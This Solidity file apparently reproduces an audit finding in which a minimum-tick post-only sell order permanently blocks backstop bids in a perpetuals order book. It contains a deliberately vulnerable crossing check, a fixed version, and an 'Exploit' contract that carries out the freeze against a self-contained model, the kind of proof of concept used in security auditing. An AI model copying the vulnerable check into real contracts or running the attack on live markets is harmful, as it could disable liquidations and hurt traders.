// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of GTE Perps finding 64835 (H-02):
// "Backstop bid-side frozen by tick-size constraint".
//
// Three real guards from the audited source combine into a permanent liveness
// trap on the BACKSTOP book's bid side (the book liquidations rely on):
//
//   (a) Market.placeOrder       (contracts/perps/types/Market.sol:136)
//       backstop orders are maker-or-cancel (post-only) ONLY.
//   (b) CLOBLib.placeOrder +    (contracts/perps/types/CLOBLib.sol:139)
//       Book.assertPriceInBounds (contracts/perps/types/Book.sol:90)
//       a maker price must be non-zero AND a multiple of tickSize, so the
//       smallest legal price is exactly `tickSize`.
//   (c) CLOBLib._executeBuyOrder (contracts/perps/types/CLOBLib.sol:231)
//       a post-only buy that would cross reverts — and the crossing test uses
//       a NON-STRICT `getBestAsk() <= newOrder.price`.
//
// Attack: park a SELL backstop maker at price == tickSize (the smallest grid
// point). That becomes getBestAsk() == tickSize. Every legal BUY backstop price
// is a positive multiple of tickSize, so its minimum is ALSO tickSize == bestAsk;
// the non-strict `<=` then always fires -> PostOnlyOrderWouldBeFilled. No lower
// legal positive price exists, so NO backstop bid can ever be posted while the
// min-tick ask sits there: the backstop bid side is permanently frozen and the
// liquidation engine can no longer rely on backstop bids (liveness DoS).
//
// Faithful reduction (per triage): the guard expressions are inlined VERBATIM.
// Only the order tree is reduced to a stored best-ask / best-bid, an exact
// stand-in for the RedBlackTree minimum()/maximum() in the single-parked-order
// scenario the trap depends on (the bug is a pure predicate trap, independent of
// tree internals). Note the empty-tree sentinels are preserved: an empty askTree
// minimum() == type(uint256).max, an empty bidTree maximum() == 0 — matching
// BookRedBlackTreeLib, so a bid never spuriously "crosses" an empty ask side.
// ─────────────────────────────────────────────────────────────────────────────

// ── Verbatim enums (contracts/perps/types/Enums.sol) ─────────────────────────
enum Side {
    BUY,
    SELL
}

enum TiF {
    // MAKER
    GTC, // good-till-cancelled
    MOC, // maker-or-cancel (post-only)
    // TAKER
    FOK, // fill-or-kill
    IOC // immediate-or-cancel
}

enum BookType {
    STANDARD,
    BACKSTOP
}

// ── Errors (verbatim names from Market.sol / CLOBLib.sol / Book.sol) ─────────
error InvalidBackstopOrder();
error InvalidMakerPrice();
error OrderPriceOutOfBounds();
error PostOnlyOrderWouldBeFilled();
error ZeroAmount();

// Minimal faithful Order (real fields: price / amount / side / tif).
struct Order {
    uint256 price;
    uint256 amount;
    Side side;
    TiF tif;
}

// The order book state. `askMin` stands in for askTree.minimum(), `bidMax` for
// bidTree.maximum(); `tickSize` stands in for the stored book settings.
struct Book {
    uint256 tickSize;
    uint256 askMin; // askTree.minimum(): type(uint256).max when empty
    uint256 bidMax; // bidTree.maximum(): type(uint256).min (0) when empty
    uint256 numBids;
    uint256 numAsks;
}

/// @dev Faithful stand-in for Book.sol getters + assertPriceInBounds.
library BookLib {
    /// @dev Returns the highest bid price (bidTree.maximum()).
    function getBestBid(Book storage self) internal view returns (uint256) {
        return self.bidMax;
    }

    /// @dev Returns the lowest ask price (askTree.minimum()).
    function getBestAsk(Book storage self) internal view returns (uint256) {
        return self.askMin;
    }

    // contracts/perps/types/Book.sol:88-91 (verbatim guard; tickSize is the
    // stored book setting, abstracted to self.tickSize).
    function assertPriceInBounds(Book storage self, uint256 price) internal view {
        // zero price is ok for market orders
        if (price % self.tickSize != 0) revert OrderPriceOutOfBounds();
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE order-placement path (verbatim guards inlined from CLOBLib.sol).
// ─────────────────────────────────────────────────────────────────────────────
library CLOBLib {
    using BookLib for Book;

    function placeOrder(Book storage ds, Order memory newOrder, BookType bookType) internal {
        // contracts/perps/types/Market.sol:136
        if (bookType == BookType.BACKSTOP && newOrder.tif != TiF.MOC) revert InvalidBackstopOrder();

        // contracts/perps/types/CLOBLib.sol:139 — time in force below 1 is maker
        if (uint8(newOrder.tif) <= 1 && newOrder.price == 0) revert InvalidMakerPrice();
        if (newOrder.amount == 0) revert ZeroAmount();
        ds.assertPriceInBounds(newOrder.price);

        if (newOrder.side == Side.BUY) _executeBuyOrder(ds, newOrder, newOrder.tif);
        else _executeSellOrder(ds, newOrder, newOrder.tif);
    }

    function _executeBuyOrder(Book storage ds, Order memory newOrder, TiF tif) internal {
        // if price crosses the book
        if (ds.getBestAsk() <= newOrder.price) { // @> CLOBLib.sol:231 non-strict `<=` traps the min-tick bid against a min-tick ask
            if (tif == TiF.MOC) revert PostOnlyOrderWouldBeFilled();
        }
        // post the maker bid
        if (newOrder.price > ds.bidMax) ds.bidMax = newOrder.price;
        ds.numBids++;
    }

    function _executeSellOrder(Book storage ds, Order memory newOrder, TiF tif) internal {
        // if price crosses the book
        if (ds.getBestBid() >= newOrder.price) {
            if (tif == TiF.MOC) revert PostOnlyOrderWouldBeFilled();
        }
        // post the maker ask
        if (newOrder.price < ds.askMin) ds.askMin = newOrder.price;
        ds.numAsks++;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED path: the recommended one-tick buffer for post-only backstop orders,
// i.e. a post-only order resting AT the best opposite price no longer counts as
// crossing (strict `<` / `>`).
// ─────────────────────────────────────────────────────────────────────────────
library CLOBLibFixed {
    using BookLib for Book;

    function placeOrder(Book storage ds, Order memory newOrder, BookType bookType) internal {
        if (bookType == BookType.BACKSTOP && newOrder.tif != TiF.MOC) revert InvalidBackstopOrder();

        if (uint8(newOrder.tif) <= 1 && newOrder.price == 0) revert InvalidMakerPrice();
        if (newOrder.amount == 0) revert ZeroAmount();
        ds.assertPriceInBounds(newOrder.price);

        if (newOrder.side == Side.BUY) _executeBuyOrder(ds, newOrder, newOrder.tif);
        else _executeSellOrder(ds, newOrder, newOrder.tif);
    }

    function _executeBuyOrder(Book storage ds, Order memory newOrder, TiF tif) internal {
        // FIX: strict `<` — a post-only bid resting AT the best ask is allowed to post.
        if (ds.getBestAsk() < newOrder.price) {
            if (tif == TiF.MOC) revert PostOnlyOrderWouldBeFilled();
        }
        if (newOrder.price > ds.bidMax) ds.bidMax = newOrder.price;
        ds.numBids++;
    }

    function _executeSellOrder(Book storage ds, Order memory newOrder, TiF tif) internal {
        // FIX: strict `>` — a post-only ask resting AT the best bid is allowed to post.
        if (ds.getBestBid() > newOrder.price) {
            if (tif == TiF.MOC) revert PostOnlyOrderWouldBeFilled();
        }
        if (newOrder.price < ds.askMin) ds.askMin = newOrder.price;
        ds.numAsks++;
    }
}

// ── External market wrappers (so the placement path is an external call the
//    exploit can drive and try/catch). ─────────────────────────────────────────
contract BackstopMarket {
    using BookLib for Book;

    Book internal book;

    constructor(uint256 _tickSize) {
        book.tickSize = _tickSize;
        book.askMin = type(uint256).max; // empty askTree.minimum()
        book.bidMax = type(uint256).min; // empty bidTree.maximum() == 0
    }

    function placeOrder(Order calldata args, BookType bookType) external {
        Order memory newOrder = args;
        CLOBLib.placeOrder(book, newOrder, bookType);
    }

    function getBestAsk() external view returns (uint256) {
        return book.getBestAsk();
    }

    function getBestBid() external view returns (uint256) {
        return book.getBestBid();
    }

    function numBids() external view returns (uint256) {
        return book.numBids;
    }

    function tickSize() external view returns (uint256) {
        return book.tickSize;
    }
}

contract BackstopMarketFixed {
    using BookLib for Book;

    Book internal book;

    constructor(uint256 _tickSize) {
        book.tickSize = _tickSize;
        book.askMin = type(uint256).max;
        book.bidMax = type(uint256).min;
    }

    function placeOrder(Order calldata args, BookType bookType) external {
        Order memory newOrder = args;
        CLOBLibFixed.placeOrder(book, newOrder, bookType);
    }

    function getBestAsk() external view returns (uint256) {
        return book.getBestAsk();
    }

    function numBids() external view returns (uint256) {
        return book.numBids;
    }
}

/// @dev Minimal ERC20 marker token. Records the frozen-bid magnitude at the SINK.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: an attacker parks a SELL backstop at the minimum tick, which
// permanently blocks EVERY legal backstop BID. The frozen backstop-bid liquidity
// is recorded on a MARKER token minted to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant TICK = 1e15; // book tick size (smallest grid point)
    uint256 internal constant BID_AMOUNT = 5_000 ether; // frozen backstop-bid liquidity

    MiniToken public marker;
    BackstopMarket public vulnBook;
    BackstopMarketFixed public fixedBook;

    address public markerAddr;
    address public vulnBookAddr;
    address public fixedBookAddr;

    // Observable results.
    uint256 public bestAskAfterPark; // == TICK
    bool public bidBlocked; // the min-tick backstop bid reverts
    bool public subTickRejected; // no legal price BELOW the tick exists
    bool public zeroPriceRejected; // maker price 0 is illegal too
    bool public controlBidPosts; // ask one tick higher -> the same bid posts
    uint256 public frozenBidAmount;
    uint256 public sinkMarkerBalance;

    constructor() {
        marker = new MiniToken("GTE Backstop Frozen Bid", "FROZEN-BID"); // deploy 0
        vulnBook = new BackstopMarket(TICK); // deploy 1
        fixedBook = new BackstopMarketFixed(TICK); // deploy 2
        markerAddr = address(marker);
        vulnBookAddr = address(vulnBook);
        fixedBookAddr = address(fixedBook);
    }

    function run() external payable {
        // 1. Attacker parks a SELL backstop maker at the smallest grid point.
        vulnBook.placeOrder(
            Order({price: TICK, amount: BID_AMOUNT, side: Side.SELL, tif: TiF.MOC}), BookType.BACKSTOP
        );
        bestAskAfterPark = vulnBook.getBestAsk();
        require(bestAskAfterPark == TICK, "ask not parked at min tick");

        // 2. HARM: the only legal minimum backstop BID price (== tickSize == bestAsk)
        //    trips the non-strict `<=` crossing rule -> PostOnlyOrderWouldBeFilled.
        try vulnBook.placeOrder(
            Order({price: TICK, amount: BID_AMOUNT, side: Side.BUY, tif: TiF.MOC}), BookType.BACKSTOP
        ) {
            bidBlocked = false;
        } catch {
            bidBlocked = true;
        }
        require(bidBlocked, "min-tick backstop bid should be frozen");

        // 3. No lower LEGAL positive price exists: a sub-tick price is off-grid
        //    (OrderPriceOutOfBounds) and a zero price is an invalid maker price.
        try vulnBook.placeOrder(
            Order({price: TICK - 1, amount: BID_AMOUNT, side: Side.BUY, tif: TiF.MOC}), BookType.BACKSTOP
        ) {
            subTickRejected = false;
        } catch {
            subTickRejected = true;
        }
        require(subTickRejected, "sub-tick price must be rejected");

        try vulnBook.placeOrder(
            Order({price: 0, amount: BID_AMOUNT, side: Side.BUY, tif: TiF.MOC}), BookType.BACKSTOP
        ) {
            zeroPriceRejected = false;
        } catch {
            zeroPriceRejected = true;
        }
        require(zeroPriceRejected, "zero maker price must be rejected");

        // 4. Negative control (same buggy code): park the ask ONE TICK HIGHER
        //    (2*tick) on a fresh book -> the identical bid @ tick posts fine,
        //    proving the freeze is caused specifically by the min-tick ask under `<=`.
        BackstopMarket control = new BackstopMarket(TICK);
        control.placeOrder(
            Order({price: 2 * TICK, amount: BID_AMOUNT, side: Side.SELL, tif: TiF.MOC}), BookType.BACKSTOP
        );
        try control.placeOrder(
            Order({price: TICK, amount: BID_AMOUNT, side: Side.BUY, tif: TiF.MOC}), BookType.BACKSTOP
        ) {
            controlBidPosts = true;
        } catch {
            controlBidPosts = false;
        }
        require(controlBidPosts, "control bid (ask one tick higher) must post");

        // 5. Harm marker: the frozen backstop-bid liquidity is recorded at the SINK.
        frozenBidAmount = BID_AMOUNT;
        marker.mint(SINK, frozenBidAmount);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
